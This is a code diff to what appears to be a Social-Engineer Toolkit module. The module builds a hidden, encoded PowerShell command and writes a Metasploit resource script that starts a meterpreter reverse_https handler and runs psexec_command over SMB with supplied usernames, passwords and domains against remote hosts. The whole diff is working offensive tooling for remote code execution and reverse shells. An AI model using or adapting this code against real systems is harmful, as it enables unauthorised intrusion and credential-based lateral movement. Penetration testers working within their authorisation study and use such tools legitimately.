@@ -74,8 +74,6 @@ try:
     core.update_options("POWERSHELL_SOLO=ON")
     core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-    #prep_powershell_payload()
-
     try:
         core.module_reload(src.payloads.powershell.prep)
     except:
@@ -85,12 +83,12 @@ try:
     if not os.path.isdir(os.path.join(core.setdir + "reports/powershell")):
         os.makedirs(os.path.join(core.setdir + "reports/powershell"))
 
-    with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
-        x86 = fileopen.read()
+    #with open(os.path.join(core.setdir + "x86.powershell")) as fileopen:
+    #    x86 = fileopen.read()
+    x86 = open(core.setdir + "x86.powershell", "r").read()
     x86 = "powershell -nop -window hidden -noni -EncodedCommand {0}".format(x86)
     core.print_status("If you want the powershell commands and attack, they are exported to {0}".format(os.path.join(core.setdir + "reports/powershell")))
     filewrite = file(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
-    #with open(os.path.join(core.setdir + "/reports/powershell/x86_powershell_injection.txt", "w")) as filewrite:
     filewrite.write(x86)
     filewrite.close()
     payload = "windows/meterpreter/reverse_https\n"  # if we are using x86
@@ -101,19 +99,18 @@ try:
         filewrite.write("use multi/handler\n"
                         "set payload windows/meterpreter/reverse_https\n"
                         "set LPORT {0}\n"
-                        "set LHOST 0.0.0.0\n"
+                        "set LHOST {1}\n"
+                        "set EnableStageEncoding true\n"
                         "set ExitOnSession false\n"
                         "exploit -j\n"
                         "use auxiliary/admin/smb/psexec_command\n"
-                        "set RHOSTS {1}\n"
-                        "set SMBUser {2}\n"
-                        "set SMBPass {3}\n"
-                        "set SMBDomain {4}\n"
-                        "set THREADS {5}\n"
-                        "set COMMAND {6}\n"
-                        "set EnableStageEncoding {7}\n"
-                        "set ExitOnSession false\n"
-                        "exploit\n".format(port, rhosts, username, password, domain, threads, command, stage_encoding))
+                        "set RHOSTS {2}\n"
+                        "set SMBUser {3}\n"
+                        "set SMBPass {4}\n"
+                        "set SMBDomain {5}\n"
+                        "set THREADS {6}\n"
+                        "set COMMAND {7}\n"
+                        "exploit\n".format(port, ipaddr, rhosts, username, password, domain, threads, command, stage_encoding))
 
     # launch metasploit below
     core.print_status("Launching Metasploit.. This may take a few seconds.")
